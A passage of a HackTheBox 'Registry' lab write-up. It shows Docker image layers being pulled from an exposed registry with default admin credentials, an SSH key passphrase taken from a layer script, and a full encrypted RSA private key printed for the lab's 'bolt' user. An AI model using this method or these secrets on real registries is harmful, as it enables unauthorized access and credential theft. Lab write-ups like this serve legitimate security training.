<p><img src="/img/registry/registry-latest.png" alt="HackTheBox-Registry" title="Registry Latest"></p>
<p>Open this file and we will see a lot of blobSum does have the <code>latest</code> repository in a Docker registry. Each of them will contains some info like password, files, ssh key etc.</p>
<p>Here are some blobs from <strong><em>latest</em></strong>.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry </span><br><span class="line">‚ùØ cat latest</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">   <span class="string">"schemaVersion"</span>: 1,</span><br><span class="line">   <span class="string">"name"</span>: <span class="string">"bolt-image"</span>,</span><br><span class="line">   <span class="string">"tag"</span>: <span class="string">"latest"</span>,</span><br><span class="line">   <span class="string">"architecture"</span>: <span class="string">"amd64"</span>,</span><br><span class="line">   <span class="string">"fsLayers"</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"blobSum"</span>: <span class="string">"sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"blobSum"</span>: <span class="string">"sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"blobSum"</span>: <span class="string">"sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"blobSum"</span>: <span class="string">"sha256:c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"blobSum"</span>: <span class="string">"sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"blobSum"</span>: <span class="string">"sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"blobSum"</span>: <span class="string">"sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"blobSum"</span>: <span class="string">"sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"blobSum"</span>: <span class="string">"sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"blobSum"</span>: <span class="string">"sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff"</span></span><br><span class="line">      &#125;</span><br><span class="line">   ],</span><br><span class="line">   <span class="string">"history"</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"v1Compatibility"</span>: <span class="string">"&#123;\"architecture\":\"amd64\",\"config\":&#123;\"Hostname\":\"e2e880122289\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":true,\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":true,\"OpenStdin\":true,\"StdinOnce\":true,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"bash\"],\"Image\":\"docker.registry.htb/bolt-image\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":&#123;&#125;&#125;,\"container\":\"e2e88012228993b25b697ee37a0aae0cb0ecef7b1536d2b8e488a6ec3f353f14\",\"container_config\":&#123;\"Hostname\":\"e2e880122289\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":true,\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":true,\"OpenStdin\":true,\"StdinOnce\":true,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"bash\"],\"Image\":\"docker.registry.htb/bolt-image\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":&#123;&#125;&#125;,\"created\":\"2019-05-25T15:18:56.9530238Z\",\"docker_version\":\"18.09.2\",\"id\":\"f18c41121574af38e7d88d4f5d7ea9d064beaadd500d13d33e8c419d01aa5ed5\",\"os\":\"linux\",\"parent\":\"9380d9cebb5bc76f02081749a8e795faa5b5cb638bf5301a1854048ff6f8e67e\"&#125;"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"v1Compatibility"</span>: <span class="string">"&#123;\"id\":\"9380d9cebb5bc76f02081749a8e795faa5b5cb638bf5301a1854048ff6f8e67e\",\"parent\":\"d931b2ca04fc8c77c7cbdce00f9a79b1954e3509af20561bbb8896916ddd1c34\",\"created\":\"2019-05-25T15:13:31.3975799Z\",\"container_config\":&#123;\"Cmd\":[\"bash\"]&#125;&#125;"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"v1Compatibility"</span>: <span class="string">"&#123;\"id\":\"d931b2ca04fc8c77c7cbdce00f9a79b1954e3509af20561bbb8896916ddd1c34\",\"parent\":\"489e49942f587534c658da9060cbfc0cdb999865368926fab28ccc7a7575283a\",\"created\":\"2019-05-25T14:57:27.6745842Z\",\"container_config\":&#123;\"Cmd\":[\"bash\"]&#125;&#125;"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"v1Compatibility"</span>: <span class="string">"&#123;\"id\":\"489e49942f587534c658da9060cbfc0cdb999865368926fab28ccc7a7575283a\",\"parent\":\"7f0ab92fdf7dd172ef58247894413e86cfc60564919912343c9b2e91cd788ae4\",\"created\":\"2019-05-25T14:47:52.6859489Z\",\"container_config\":&#123;\"Cmd\":[\"bash\"]&#125;&#125;"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"v1Compatibility"</span>: <span class="string">"&#123;\"id\":\"7f0ab92fdf7dd172ef58247894413e86cfc60564919912343c9b2e91cd788ae4\",\"parent\":\"5f7e711dba574b5edd0824a9628f3b91bfd20565a5630bbd70f358f0fc4ebe95\",\"created\":\"2019-05-24T22:51:14.8744838Z\",\"container_config\":&#123;\"Cmd\":[\"/bin/bash\"]&#125;&#125;"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"v1Compatibility"</span>: <span class="string">"&#123;\"id\":\"5f7e711dba574b5edd0824a9628f3b91bfd20565a5630bbd70f358f0fc4ebe95\",\"parent\":\"f75463b468b510b7850cd69053a002a6f10126be3764b570c5f80a7e5044974c\",\"created\":\"2019-04-26T22:21:05.100534088Z\",\"container_config\":&#123;\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"/bin/bash\\\"]\"]&#125;,\"throwaway\":true&#125;"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"v1Compatibility"</span>: <span class="string">"&#123;\"id\":\"f75463b468b510b7850cd69053a002a6f10126be3764b570c5f80a7e5044974c\",\"parent\":\"4b937c36cc17955293cc01d8c7c050c525d22764fa781f39e51afbd17e3e5529\",\"created\":\"2019-04-26T22:21:04.936777709Z\",\"container_config\":&#123;\"Cmd\":[\"/bin/sh -c mkdir -p /run/systemd \\u0026\\u0026 echo 'docker' \\u003e /run/systemd/container\"]&#125;&#125;"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"v1Compatibility"</span>: <span class="string">"&#123;\"id\":\"4b937c36cc17955293cc01d8c7c050c525d22764fa781f39e51afbd17e3e5529\",\"parent\":\"ab4357bfcbef1a7eaa70cfaa618a0b4188cccafa53f18c1adeaa7d77f5e57939\",\"created\":\"2019-04-26T22:21:04.220422684Z\",\"container_config\":&#123;\"Cmd\":[\"/bin/sh -c rm -rf /var/lib/apt/lists/*\"]&#125;&#125;"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"v1Compatibility"</span>: <span class="string">"&#123;\"id\":\"ab4357bfcbef1a7eaa70cfaa618a0b4188cccafa53f18c1adeaa7d77f5e57939\",\"parent\":\"f4a833e38a779e09219325dfef9e5063c291a325cad7141bcdb4798ed68c675c\",\"created\":\"2019-04-26T22:21:03.471632173Z\",\"container_config\":&#123;\"Cmd\":[\"/bin/sh -c set -xe \\t\\t\\u0026\\u0026 echo '#!/bin/sh' \\u003e /usr/sbin/policy-rc.d \\t\\u0026\\u0026 echo 'exit 101' \\u003e\\u003e /usr/sbin/policy-rc.d \\t\\u0026\\u0026 chmod +x /usr/sbin/policy-rc.d \\t\\t\\u0026\\u0026 dpkg-divert --local --rename --add /sbin/initctl \\t\\u0026\\u0026 cp -a /usr/sbin/policy-rc.d /sbin/initctl \\t\\u0026\\u0026 sed -i 's/^exit.*/exit 0/' /sbin/initctl \\t\\t\\u0026\\u0026 echo 'force-unsafe-io' \\u003e /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \\t\\t\\u0026\\u0026 echo 'DPkg::Post-Invoke &#123; \\\"rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true\\\"; &#125;;' \\u003e /etc/apt/apt.conf.d/docker-clean \\t\\u0026\\u0026 echo 'APT::Update::Post-Invoke &#123; \\\"rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true\\\"; &#125;;' \\u003e\\u003e /etc/apt/apt.conf.d/docker-clean \\t\\u0026\\u0026 echo 'Dir::Cache::pkgcache \\\"\\\"; Dir::Cache::srcpkgcache \\\"\\\";' \\u003e\\u003e /etc/apt/apt.conf.d/docker-clean \\t\\t\\u0026\\u0026 echo 'Acquire::Languages \\\"none\\\";' \\u003e /etc/apt/apt.conf.d/docker-no-languages \\t\\t\\u0026\\u0026 echo 'Acquire::GzipIndexes \\\"true\\\"; Acquire::CompressionTypes::Order:: \\\"gz\\\";' \\u003e /etc/apt/apt.conf.d/docker-gzip-indexes \\t\\t\\u0026\\u0026 echo 'Apt::AutoRemove::SuggestsImportant \\\"false\\\";' \\u003e /etc/apt/apt.conf.d/docker-autoremove-suggests\"]&#125;&#125;"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"v1Compatibility"</span>: <span class="string">"&#123;\"id\":\"f4a833e38a779e09219325dfef9e5063c291a325cad7141bcdb4798ed68c675c\",\"created\":\"2019-04-26T22:21:02.724843678Z\",\"container_config\":&#123;\"Cmd\":[\"/bin/sh -c #(nop) ADD file:7ce84f13f11609a50ece7823578159412e2299c812746d1d1f1ed5db0728bd37 in / \"]&#125;&#125;"</span></span><br><span class="line">      &#125;</span><br><span class="line">   ],</span><br><span class="line">   <span class="string">"signatures"</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">"header"</span>: &#123;</span><br><span class="line">            <span class="string">"jwk"</span>: &#123;</span><br><span class="line">               <span class="string">"crv"</span>: <span class="string">"P-256"</span>,</span><br><span class="line">               <span class="string">"kid"</span>: <span class="string">"VUEK:AQ5E:PKKZ:YK3J:YU44:72EU:GB57:BMI2:QMIK:DZEH:73WL:Q7BY"</span>,</span><br><span class="line">               <span class="string">"kty"</span>: <span class="string">"EC"</span>,</span><br><span class="line">               <span class="string">"x"</span>: <span class="string">"yS0jBSmoO13WXoTRXRcp_OsqPZ3-ttTv3biBxexcyCo"</span>,</span><br><span class="line">               <span class="string">"y"</span>: <span class="string">"JpwUWLV6IwW720h8XgeRpCvPoeZ_f8I82qIprZvEgm4"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">"alg"</span>: <span class="string">"ES256"</span></span><br><span class="line">         &#125;,</span><br><span class="line">         <span class="string">"signature"</span>: <span class="string">"9E2loVJqpUIUj3EnEIrSKzOWaHvHKEsdAgcPX8sr152QKzWw3J7SgwLOnXPaJWegHyjYjTDnsNyEauNF8_J2SA"</span>,</span><br><span class="line">         <span class="string">"protected"</span>: <span class="string">"eyJmb3JtYXRMZW5ndGgiOjY3OTIsImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyMC0wNC0wNFQwMDoyNzo1MVoifQ"</span></span><br><span class="line">      &#125;</span><br><span class="line">   ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Exploring-the-blobSums"><a href="#Exploring-the-blobSums" class="headerlink" title="Exploring the blobSums"></a>Exploring the blobSums</h3><p>So I need to explore each blobSum, i will download each using <strong><em>wget</em></strong> and look for interesting stuffs. so:</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry </span><br><span class="line">‚ùØ wget --no-check-certificate --http-user=admin --http-password=admin https:<span class="comment">//docker.registry.htb/v2/bolt-image/blobs/sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b</span></span><br><span class="line">-<span class="number">-2020</span><span class="number">-04</span><span class="number">-04</span> <span class="number">08</span>:<span class="number">38</span>:<span class="number">15</span>--  https:<span class="comment">//docker.registry.htb/v2/bolt-image/blobs/sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b</span></span><br><span class="line">Resolving docker.registry.htb (docker.registry.htb)... <span class="number">10.10</span><span class="number">.10</span><span class="number">.159</span></span><br><span class="line">Connecting to docker.registry.htb (docker.registry.htb)|<span class="number">10.10</span><span class="number">.10</span><span class="number">.159</span>|:<span class="number">443.</span>.. connected.</span><br><span class="line">WARNING: The certificate of ‚Äòdocker.registry.htb‚Äô <span class="keyword">is</span> not trusted.</span><br><span class="line">WARNING: The certificate of ‚Äòdocker.registry.htb‚Äô doesn<span class="string">'t have a known issuer.</span></span><br><span class="line"><span class="string">HTTP request sent, awaiting response... 401 Unauthorized</span></span><br><span class="line"><span class="string">Authentication selected: Basic realm="Registry"</span></span><br><span class="line"><span class="string">Reusing existing connection to docker.registry.htb:443.</span></span><br><span class="line"><span class="string">HTTP request sent, awaiting response... 200 OK</span></span><br><span class="line"><span class="string">Length: 335 [application/octet-stream]</span></span><br><span class="line"><span class="string">Saving to: ‚Äòsha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b‚Äô</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sha256:302bfcb3f10c386a25a58913917257bd2fe7721 100%[===================================================================================================&gt;]     335  --.-KB/s    in 0s      </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2020-04-04 08:38:16 (250 MB/s) - ‚Äòsha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b‚Äô saved [335/335]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root in htb/boxes/Registry </span></span><br><span class="line"><span class="string">‚ùØ ls</span></span><br><span class="line"><span class="string">install  install.gz  latest  nmap-Registry  registry-directories  sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b</span></span><br></pre></td></tr></table></figure>

<p>Then i will moved it to into <code>.gz</code> file and decompressed it.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># move to .gz file</span></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry </span><br><span class="line">‚ùØ mv sha256\:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b sha256\:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># decompressed with gunzip</span></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry </span><br><span class="line">‚ùØ gunzip sha256\:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b.gz</span><br></pre></td></tr></table></figure>

<p>Finally i can now read whats is on the first blob.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry </span><br><span class="line">‚ùØ cat sha256\:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b </span><br><span class="line">etc/0040755000000000000000000000000013472256035010032 5ustar0000000000000000etc/profile.d/0040755000000000000000000000000013472256264011720 5ustar0000000000000000etc/profile.d/01-ssh.sh0100755000000000000000000000033613472067523013267 0ustar0000000000000000<span class="comment">#!/usr/bin/expect -f</span></span><br><span class="line"><span class="comment">#eval `ssh-agent -s`</span></span><br><span class="line">spawn ssh-add /root/.ssh/id_rsa</span><br><span class="line">expect <span class="string">"Enter passphrase for /root/.ssh/id_rsa:"</span></span><br><span class="line">send <span class="string">"GkOcz221Ftb3ugog\n"</span>;</span><br><span class="line">expect <span class="string">"Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"</span></span><br><span class="line">interact</span><br><span class="line">etc/profile.d/.wh.02-ssh.sh0000600000000000000000000000000013472256232013730 0ustar0000000000000000</span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure>

<p>Base on the first blob i download it looks like the <code>&quot;GkOcz221Ftb3ugog&quot;</code> is a password for <strong><em>SSH Key</em></strong> but I don‚Äôt have the <code>id_rsa</code> which is needed as from this line.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">expect <span class="string">"Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"</span></span><br></pre></td></tr></table></figure>

<h3 id="Hunting-the-Private-key"><a href="#Hunting-the-Private-key" class="headerlink" title="Hunting the Private key"></a>Hunting the Private key</h3><p>So i need more blobSum to get the <code>id_rsa key</code>, the 2nd blob was empty. and thid blob looks interesting this one is 100 mb total of files so:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> boxes/Registry/docker </span><br><span class="line">‚ùØ wget --no-check-certificate --http-user=admin --http-password=admin https://docker.registry.htb/v2/bolt-image/blobs/sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791</span><br><span class="line">--2020-04-04 09:03:19--  https://docker.registry.htb/v2/bolt-image/blobs/sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791</span><br><span class="line">Resolving docker.registry.htb (docker.registry.htb)... 10.10.10.159</span><br><span class="line">Connecting to docker.registry.htb (docker.registry.htb)|10.10.10.159|:443... connected.</span><br><span class="line">WARNING: The certificate of ‚Äòdocker.registry.htb‚Äô is not trusted.</span><br><span class="line">WARNING: The certificate of ‚Äòdocker.registry.htb‚Äô doesn<span class="string">'t have a known issuer.</span></span><br><span class="line"><span class="string">HTTP request sent, awaiting response... 401 Unauthorized</span></span><br><span class="line"><span class="string">Authentication selected: Basic realm="Registry"</span></span><br><span class="line"><span class="string">Reusing existing connection to docker.registry.htb:443.</span></span><br><span class="line"><span class="string">HTTP request sent, awaiting response... 200 OK</span></span><br><span class="line"><span class="string">Length: 104569678 (100M) [application/octet-stream]</span></span><br><span class="line"><span class="string">Saving to: ‚Äòsha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791‚Äô</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sha256:2931a8b44e495489fdbe2bccd7232e99b182034 100%[===================================================================================================&gt;]  99.72M   752KB/s    in 2m 56s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2020-04-04 09:06:16 (580 KB/s) - ‚Äòsha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791‚Äô saved [104569678/104569678]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root in boxes/Registry/docker took 2m57s </span></span><br><span class="line"><span class="string">‚ùØ</span></span><br></pre></td></tr></table></figure>

<h3 id="Get-in-into-the-REGISTRY"><a href="#Get-in-into-the-REGISTRY" class="headerlink" title="Get in into the REGISTRY"></a>Get in into the REGISTRY</h3><p>after the download finished I explore the <code>/root</code> directory which contains the <code>.ssh</code> directory which has <code>id_rsa</code> and <code>config</code> file.</p>
<p><img src="/img/registry/registry-rsa-key.png" alt="HackTheBox-Registry" title="Registry NGINX"></p>
<p>I look first at the config file and the user for <strong><em>SSH</em></strong> is <strong><em>bolt</em></strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">Host registry</span><br><span class="line">  User bolt</span><br><span class="line">  Port 22</span><br><span class="line">  Hostname registry.htb</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791 (1)/root/.ssh</span><br></pre></td></tr></table></figure>

<p>and the <strong><em>RSA Key</em></strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> boxes/Registry/docker</span><br><span class="line">‚ùØ cat id_rsa</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: AES-128-CBC,1C98FA248505F287CCC597A59CF83AB9</span><br><span class="line"></span><br><span class="line">KF9YHXRjDZ35Q9ybzkhcUNKF8DSZ+aNLYXPL3kgdqlUqwfpqpbVdHbMeDk7qbS7w</span><br><span class="line">KhUv4Gj22O1t3koy9z0J0LpVM8NLMgVZhTj1eAlJO72dKBNNv5D4qkIDANmZeAGv</span><br><span class="line">7RwWef8FwE3jTzCDynKJbf93Gpy/hj/SDAe77PD8J/Yi01Ni6MKoxvKczL/gktFL</span><br><span class="line">/mURh0vdBrIfF4psnYiOcIDCkM2EhcVCGXN6BSUxBud+AXF0QP96/8UN8A5+O115</span><br><span class="line">p7eljdDr2Ie2LlF7dhHSSEMQG7lUqfEcTmsqSuj9lBwfN22OhFxByxPvkC6kbSyH</span><br><span class="line">XnUqf+utie21kkQzU1lchtec8Q4BJIMnRfv1kufHJjPFJMuWFRbYAYlL7ODcpIvt</span><br><span class="line">UgWJgsYyquf/61kkaSmc8OrHc0XOkif9KE63tyWwLefOZgVgrx7WUNRNt8qpjHiT</span><br><span class="line">nfcjTEcOSauYmGtXoEI8LZ+oPBniwCB4Qx/TMewia/qU6cGfX9ilnlpXaWvbq39D</span><br><span class="line">F1KTFBvwkM9S1aRJaPYu1szLrGeqOGH66dL24f4z4Gh69AZ5BCYgyt3H2+FzZcRC</span><br><span class="line">iSnwc7hdyjDI365ZF0on67uKVDfe8s+EgXjJWWYWT7rwxdWOCzhd10TYuSdZv3MB</span><br><span class="line">TdY/nF7oLJYyO2snmedg2x11vIG3fVgvJa9lDfy5cA9teA3swlOSkeBqjRN+PocS</span><br><span class="line">5/9RBV8c3HlP41I/+oV5uUTInaxCZ/eVBGVgVe5ACq2Q8HvW3HDvLEz36lTw+kGE</span><br><span class="line">SxbxZTx1CtLuyPz7oVxaCStn7Cl582MmXlp/MBU0LqodV44xfhnjmDPUK6cbFBQc</span><br><span class="line">GUeTlxw+gRwby4ebLLGdTtuYiJQDlZ8itRMTGIHLyWJEGVnO4MsX0bAOnkBRllhA</span><br><span class="line">CqceFXlVE+K3OfGpo3ZYj3P3xBeDG38koE2CaxEKQazHc06aF5zlcxUNBusOxNK4</span><br><span class="line">ch2x+BpuhB0DWavdonHj+ZU9nuCLUhdy3kjg0FxqgHKZo3k55ai+4hFUIT5fTNHA</span><br><span class="line">iuMLFSAwONGOf+926QUQd1xoeb/n8h5b0kFYYVD3Vkt4Fb+iBStVG6pCneN2lILq</span><br><span class="line">rSVi9oOIy+NRrBg09ZpMLXIQXLhHSk3I7vMhcPoWzBxPyMU29ffxouK0HhkARaSP</span><br><span class="line">3psqRVI5GPsnGuWLfyB2HNgQWNHYQoILdrPOpprxUubnRg7gExGpmPZALHPed8GP</span><br><span class="line">pLuvFCgn+SCf+DBWjMuzP3XSoN9qBSYeX8OKg5r3V19bhz24i2q/HMULWQ6PLzNb</span><br><span class="line">v0NkNzCg3AXNEKWaqF6wi7DjnHYgWMzmpzuLj7BOZvLwWJSLvONTBJDFa4fK5nUH</span><br><span class="line">UnYGl+WT+aYpMfp6vd6iMtet0bh9wif68DsWqaqTkPl58z80gxyhpC2CGyEVZm/h</span><br><span class="line">P03LMb2YQUOzBBTL7hOLr1VuplapAx9lFp6hETExaM6SsCp/StaJfl0mme8tw0ue</span><br><span class="line">QtwguqwQiHrmtbp2qsaOUB0LivMSzyJjp3hWHFUSYkcYicMnsaFW+fpt+ZeGGWFX</span><br><span class="line">bVpjhWwaBftgd+KNg9xl5RTNXs3hjJePHc5y06SfOpOBYqgdL42UlAcSEwoQ76VB</span><br><span class="line">YGk+dTQrDILawDDGnSiOGMrn4hzmtRAarLZWvGiOdppdIqsfpKYfUcsgENjTK95z</span><br><span class="line">zrey3tjXzObM5L1MkjYYIYVjXMMygJDaPLQZfZTchUNp8uWdnamIVrvqHGvWYES/</span><br><span class="line">FGoeATGL9J5NVXlMA2fXRue84sR7q3ikLgxDtlh6w5TpO19pGBO9Cmg1+1jqRfof</span><br><span class="line">eIb4IpAp01AVnMl/D/aZlHb7adV+snGydmT1S9oaN+3z/3pHQu3Wd7NWsGMDmNdA</span><br><span class="line">+GB79xf0rkL0E6lRi7eSySuggposc4AHPAzWYx67IK2g2kxx9M4lCImUO3oftGKJ</span><br><span class="line">P/ccClA4WKFMshADxxh/eWJLCCSEGvaLoow+b1lcIheDYmOxQykBmg5AM3WpTpAN</span><br><span class="line">T+bI/6RA+2aUm92bNG+P/Ycsvvyh/jFm5vwoxuKwINUrkACdQ3gRakBc1eH2x014</span><br><span class="line">6B/Yw+ZGcyj738GHH2ikfyrngk1M+7IFGstOhUed7pZORnhvgpgwFporhNOtlvZ1</span><br><span class="line">/e9jJqfo6W8MMDAe4SxCMDujGRFiABU3FzD5FjbqDzn08soaoylsNQd/BF7iG1RB</span><br><span class="line">Y7FEPw7yZRbYfiY8kfve7dgSKfOADj98fTe4ISDG9mP+upmR7p8ULGvt+DjbPVd3</span><br><span class="line">uN3LZHaX5ECawEt//KvO0q87TP8b0pofBhTmJHUUnVW2ryKuF4IkUM3JKvAUTSg8</span><br><span class="line">K+4aT7xkNoQ84UEQvfZvUfgIpxcj6kZYnF+eakV4opmgJjVgmVQvEW4nf6ZMBRo8</span><br><span class="line">TTGugKvvTw/wNKp4BkHgXxWjyTq+5gLyppKb9sKVHVzAEpew3V20Uc30CzOyVJZi</span><br><span class="line">Bdtfi9goJBFb6P7yHapZ13W30b96ZQG4Gdf4ZeV6MPMizcTbiggZRBokZLCBMb5H</span><br><span class="line">pgkPgTrGJlbm+sLu/kt4jgex3T/NWwXHVrny5kIuTbbv1fXfyfkPqU66eysstO2s</span><br><span class="line">OxciNk4W41o9YqHHYM9D/uL6xMqO3K/LTYUI+LcCK13pkjP7/zH+bqiClfNt0D2B</span><br><span class="line">Xg6OWYK7E/DTqX+7zqNQp726sDAYKqQNpwgHldyDhOG3i8o66mLj3xODHQzBvwKR</span><br><span class="line">bJ7jrLPW+AmQwo/V8ElNFPyP6oZBEdoNVn/plMDAi0ZzBHJc7hJ0JuHnMggWFXBM</span><br><span class="line">PjxG/w4c8XV/Y2WavafEjT7hHuviSo6phoED5Zb3Iu+BU+qoEaNM/LntDwBXNEVu</span><br><span class="line">Z0pIXd5Q2EloUZDXoeyMCqO/NkcIFkx+//BDddVTFmfw21v2Y8fZ2rivF/8CeXXZ</span><br><span class="line">ot6kFb4G6gcxGpqSZKY7IHSp49I4kFsC7+tx7LU5/wqC9vZfuds/TM7Z+uECPOYI</span><br><span class="line">f41H5YN+V14S5rU97re2w49vrBxM67K+x930niGVHnqk7t/T1jcErROrhMeT6go9</span><br><span class="line">RLI9xScv6aJan6xHS+nWgxpPA7YNo2rknk/ZeUnWXSTLYyrC43dyPS4FvG8N0H1V</span><br><span class="line">94Vcvj5Kmzv0FxwVu4epWNkLTZCJPBszTKiaEWWS+OLDh7lrcmm+GP54MsLBWVpr</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791 (1)/root/.ssh </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure>

<p>I move the the <strong><em>id_rsa</em></strong> in my registry directory and do the <strong><em>SSH Login</em></strong> so:</p>
